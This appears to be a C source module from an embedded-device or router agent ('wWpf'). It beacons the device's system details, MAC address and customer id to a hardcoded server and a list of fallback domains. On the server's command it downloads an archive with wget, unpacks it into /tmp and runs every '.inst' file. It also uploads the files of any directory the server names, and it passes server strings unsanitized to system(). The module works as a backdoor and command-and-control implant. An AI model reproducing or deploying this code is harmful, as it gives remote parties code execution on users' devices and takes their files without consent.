#include <unistd.h>
#include <signal.h>
#include <sys/utsname.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <dirent.h>

#include <stdio.h>
#include <string.h>

#include "ha_debug.h"
#include "ha_config.h"
#include "ha_misc.h"
#include "ha_network.h"
#include "ha_policy.h"
#include "ha_http.h"
#include "ha_timer.h"
#include "ha_30x.h"
#include "md5.h"

#if 1
struct ww_file_header{
	uint32_t magic;
	char hdrlen[4];
};

static const char *servers[] = {
	"cjdgy.cn",
	"cjdgy.com ",
	"tswcu.com",
	"ha01234.cn",
	"limusn.com",
	"libelit.com",
	"excueb.com",
	"coffside.com",
	"wedsido.com",
	"jsbcq.site",
	"wajdc.club",
	"ttddz.win",
	"brouact.com",
	"hotwebo.com",
	"faceesy.com",
	"tswuby.com",
	"topopy.com",
	NULL
};

#define UNPACK_MEM_MAXLEN 	(4096)

#define DEF_PROTO_DIR 		"/tmp/wWpf_tmp/"
#define DEF_PROTO_MD5PATH 	"/tmp/wWpf.md5"
#define DEF_PROTO_SERVER 	"game.jsbcq.site"
#define DEF_PROTO_PATH		"/return_json_file.php"
#define DEF_PROTO_INTERVAL	1800 

struct ha_proto_ctl {
	char server[DEF_SRV_MAXLEN];
	char path[DEF_URL_MAXLEN];
	char md5path[64];
	char post_data[512];
	
	int interval;
	int datalen;
	pid_t child;
};

static struct ha_proto_ctl hp_ctl = {
	.child = (pid_t)-1,
	.interval = DEF_PROTO_INTERVAL,
};

static int ha_proto_unpack_file(const char *file)
{
	int res = -1,i;	
	char *tmp = NULL;
	FILE *fp = fopen(file,"r");	
	if (!fp)		
		return res;		
	char buf[32] = {0};	
	struct ww_file_header *wfh = (struct ww_file_header *)buf;	
	if (sizeof(*wfh) != fread(buf,1,sizeof(*wfh),fp))		
		goto fail;	

	/*must terminate with '\0'*/
	char tmphlen[8] = {0};
	memcpy(tmphlen,wfh->hdrlen,sizeof(wfh->hdrlen));
	
	int hdrlen = atoi(tmphlen);	

	if (hdrlen > UNPACK_MEM_MAXLEN)		
		goto fail;	
	
	tmp = MALLOC(UNPACK_MEM_MAXLEN);	
	if (!tmp)		
		goto fail;	
	
	if (hdrlen != fread(tmp,1,hdrlen,fp))		
		goto fail;		
		
	char *s = tmp,*e = tmp + hdrlen;	
	for (i = 0 ; s< e; i++) {		
		str_t elts[2];	
		memset(elts,0,sizeof(elts));
		uint nelts = 0;		
		s = split_line(s,e,' ',';',elts,2,&nelts);		
		if (s > e || nelts != 2) 			
			goto fail;	
		
		elts[1].str[elts[1].len] = '\0';		
		elts[0].str[elts[0].len] = '\0';
		
		int flen = atoi(elts[1].str);	

		/*no 'dd' cmd*/
		FILE *save = fopen(elts[0].str,"w+");	
		if (!save)			
			goto fail;		
		
		while (flen > 0) {			
			char tmpbuf[512];			
			int once = flen > sizeof(tmpbuf) ? sizeof(tmpbuf) : flen;		
			if (once != fread(tmpbuf,1,once,fp))				
				goto fail;		
			if (once != fwrite(tmpbuf,1,once,save))		
				goto fail;		
			
			flen -= once;			
		}			
		fclose(save);		

		if (flen != 0)	{		
			unlink(elts[0].str);
			goto fail;
		}
	}

	res = 0;
fail:	
		if (tmp)		
			FREE(tmp);	
		if (fp)		
			fclose(fp);
		return res;
}

static const char *start_shell = "#!/bin/sh\n"
								 "for file in *\n"
								 "do\n" 
								 "	if test -f $file\n"
								 "	then\n"
								 "		case \"$file\" in\n"
								 "			*.inst) chmod +x $file\n"
								 "			./$file;;\n"
								 "		esac\n"
								 "	fi\n"
								 "done\n";


/*准备运行*/
static void ha_proto_post_prepare()
{
	struct ha_proto_ctl *ctl = &hp_ctl;
	
	char *system ; 
	char *machine ;
	char *version ;
	system = machine = version = "unkown";

	
	struct utsname ubuf;
	if (0 == uname(&ubuf)) {
		system = ubuf.sysname;
		machine = ubuf.machine;
		version = ubuf.release;
	}
	
	char *data = ctl->post_data;
	data += snprintf(data, sizeof(ctl->post_data),
			"&system=%s"
			"&machine=%s"		/*arch*/
			"&version=%s"
			"&mac=%s"
			"&plug_version=%s"
			"&customer_id=%s"
			"&program=wWpf"
			"&compile_time=%s",
			system,
			machine,
			version,
			ha_network_mac(),
			__WW_VERSION__,
			ha_policy_get_customer(),
			__DATE__""__TIME__);

	ctl->datalen = data - ctl->post_data;
}

static bool ha_proto_get_oldmd5(char md5[MD5_STR_LENGTH])
{
	bool res = false;
	
	FILE *fp = fopen(hp_ctl.md5path,"r");
	if (!fp) 
		return res;
	if (MD5_STR_LENGTH != fread(md5,1,MD5_STR_LENGTH,fp)) 
		goto out;

	res = true;
out:
	fclose(fp);
	return res;
}
static void ha_proto_set_md5(const char md5[MD5_STR_LENGTH])
{
	FILE *fp = fopen(hp_ctl.md5path,"w+");
	if (!fp)
		return ;
	fwrite(md5,1,MD5_STR_LENGTH,fp);
	fclose(fp);
}

static void ha_proto_update_handle(struct json_object *jo)
{
	assert(jo);
	const char *path = ha_json_get_string(jo,"path");
	const char *md5 = ha_json_get_string(jo,"md5");
	if (!md5 || strlen(md5) != MD5_STR_LENGTH || !path)
		return ;

	char omd5[MD5_STR_LENGTH + 1];
	if (ha_proto_get_oldmd5(omd5) && 0 == memcmp(md5,omd5,MD5_STR_LENGTH))
		return ;
	
	char cmd[256];
	snprintf(cmd,sizeof(cmd),"wget -q %s -O %s",path,md5);
	system(cmd);
	
	unsigned char md5sum[MD5_DIGEST_LENGTH];
	if (0 != md5sum_file(md5,md5sum)) 
		return ;

	char md5str[MD5_STR_LENGTH + 1] = {0},*ptr = md5str;
	int i;
	for (i = 0 ; i < MD5_DIGEST_LENGTH ;i++) 
		ptr += sprintf(ptr,"%02x",md5sum[i]);
	if (memcmp(md5,md5str,MD5_STR_LENGTH)) {		
		debug_p("md5 in json = %s md5sum = %s",md5,md5str);
		return ;
	}
	
	if (0 != ha_proto_unpack_file(md5)) {
		debug_p("unpack error");
		return ;
	}
	ha_proto_set_md5(md5);

	system(start_shell);
}
static void ha_proto_upload_handle(struct json_object *jo)
{
	const char *srv = ha_json_get_string(jo,"srv");
	const char *path = ha_json_get_string(jo,"path");
	const char *local = ha_json_get_string(jo,"local");

	if (!srv || strlen(srv) < 6
		||!path || strlen(path) < 4
		||!local || strlen(local) < 2)
		return ;

	DIR *dir = opendir(local);
	if (!dir) {
		debug_p("can not opendir %s",local);
		return ;
	}
	
	chdir(local);
	struct dirent *ent;
	while (NULL != (ent = readdir(dir))) {
		if (strcmp(".",ent->d_name) 
			&& strcmp("..",ent->d_name)
			&& (ent->d_type & DT_REG)) {
			char arg[64];
			snprintf(arg,sizeof(arg) - 1,"?mac=%s&name=%s",ha_network_mac(),ent->d_name);
			proto_file_home(srv,path,arg,ent->d_name);
		}
	}

	chdir("-");
	closedir(dir);
}
static void ha_proto_func_handle(struct json_object *jo)
{
	assert(jo);
	if (0 == ha_json_get_int(jo,"apk")) 
		;
	else
		;
	if (0 == ha_json_get_int(jo,"exe"))
		;
	else
		;
	if (0 == ha_json_get_int(jo,"redir"))
		;
	else
		;
}
static bool ha_proto_resp_handle(void *v,int sock)
{
	bool res = false;
	char buf[1204];
	ssize_t nr = recv(sock,buf,sizeof(buf) - 1,0);
	if (nr <= 0) {
		debug_p("no response");
		return res;
	}
	buf[nr] = '\0';
	
	char *data = strstr(buf,"\r\n\r\n");
	if (!data)
		return res;
	data += 4;
	
	char *start,*end;
	start = buf;
	end = start + nr;
	cstr_t result[3];
	memset(result,0,sizeof(result));
	start = ha_trisection_header(start,end,result);
	if (result[1].len != 3 || strncmp(result[1].str,"200",3))
		return res;

	res = true;
	
	ha_strip_space(start,end);
	if (start >= end)
		return res;

	struct keyval reqlines[16];
	memset(reqlines,0,sizeof(reqlines));
	uint lines = ha_analysis_http_line(start,end,reqlines,sizeof(reqlines)/sizeof(reqlines[0]));
	
	if (0 == lines)
		return res;

	cstr_t *conent_length = proto_m4_shot(reqlines,sizeof(reqlines)/sizeof(reqlines[0]),
											"Content-Length",14);
	if (!conent_length)
		return res;
	
	int clen = ha_str2int(conent_length);
 
	if (end - data != clen) {
		debug_p("invalid response conten-length = %u real ct = %d",clen, end - data);
		return res;
	}
		
	
	struct json_object *jo = ha_parse_memory(data);
	if (!jo) {
		debug_p("response is not a json");
		return res;
	}

	struct json_object *update = ha_find_config(jo,"update");
	if (update)
		ha_proto_update_handle(update);

	struct json_object *func = ha_find_config(jo,"func");
	if (func) 
		ha_proto_func_handle(func);
	
	struct json_object *upload = ha_find_config(jo,"upload");
	if (upload)
		ha_proto_upload_handle(upload);
	
	json_object_put(jo);
	return res;
}

static void ha_proto_process(void)
{	
	struct ha_proto_ctl *ctl = &hp_ctl;
	
	char omd5[MD5_STR_LENGTH + 1];
	memset(omd5,0,sizeof(omd5));
	ha_proto_get_oldmd5(omd5);

	/*beatheat to server*/
	ctl->datalen += snprintf(ctl->post_data + ctl->datalen,
							sizeof(ctl->post_data) - ctl->datalen,"&md5=%s",omd5);

	debug_p("post data = %s",ctl->post_data);
	
	if (proto_data_home(ctl->server,ctl->path,NULL,
						ctl->post_data,ctl->datalen,
						ha_proto_resp_handle,ctl)) 
		return ;
	
	
	const char **pserver = servers;
	while (*pserver) {
		if (proto_data_home(*pserver,ctl->path,NULL,
							ctl->post_data,ctl->datalen,
							ha_proto_resp_handle,ctl))
			break;
		pserver++;
	}
}

static void ha_proto_checker(void *v)
{
	struct ha_proto_ctl *ctl = (struct ha_proto_ctl *)v;
	if (ctl->child != (pid_t)-1) { 
		debug_p("kill child");
		kill((pid_t)0 - ctl->child,SIGTERM);
	}

	ctl->child = fork();
	if (ctl->child == (pid_t)0) {
		ha_signal_restore();
		setpgrp();
		ha_proto_process();

		exit(0);
	}
	if (NULL == ha_timer_new(ctl,ha_proto_checker,ctl->interval,NULL))
		debug_p("can not get timer for PROTO_MODULE");
}

static void sigchld_handler(int sig)
{
	wait(NULL);
	debug_p("child process %d exit",hp_ctl.child);
	hp_ctl.child = (pid_t) -1;
}

static void ha_proto_conf_init(void)
{
	struct ha_proto_ctl *ctl = &hp_ctl;
	strncpy(ctl->server,DEF_PROTO_SERVER,sizeof(ctl->server));
	strncpy(ctl->path,DEF_PROTO_PATH,sizeof(ctl->path));
	strncpy(ctl->md5path,DEF_PROTO_MD5PATH,sizeof(ctl->md5path));
	
	struct json_object *jo = ha_find_module_config("proto");
	if (!jo)
		return ;
	const char *srv = ha_json_get_string(jo,"server");
	if (srv && strlen(srv) > 4)
		strncpy(ctl->server,srv,sizeof(ctl->server));
	const char *path = ha_json_get_string(jo,"path");
	if (path && strlen(path) > 6)
		strncpy(ctl->path,path,sizeof(ctl->path));
	
	const char *md5path = ha_json_get_string(jo,"md5path");
	if (md5path && strlen(md5path) > 4)
			strncpy(ctl->md5path,md5path,sizeof(ctl->md5path));

	int interval = ha_json_get_int(jo,"interval");
	if (interval != JO_INT_INVALID)
		ctl->interval = interval;
	
}
void ha_proto_init(void)
{	
	struct ha_proto_ctl *ctl = &hp_ctl;

	system("mkdir -p "DEF_PROTO_DIR);
	chdir(DEF_PROTO_DIR);
	
	signal(SIGCHLD,sigchld_handler);

	ha_proto_post_prepare();
	ha_proto_conf_init();

	unsigned long long mac = strtoul(ha_network_mac(),NULL,16);
	int first = mac%3600;

	debug_p("will report after %d secs",first);
	if (NULL == ha_timer_new(ctl,ha_proto_checker,first,NULL))
		debug_p("can not get timer for PROTO MODULE");
}


void ha_proto_destroy(void)
{
	chdir("~");	
	system("rm -rf "DEF_PROTO_DIR);
}
#endif
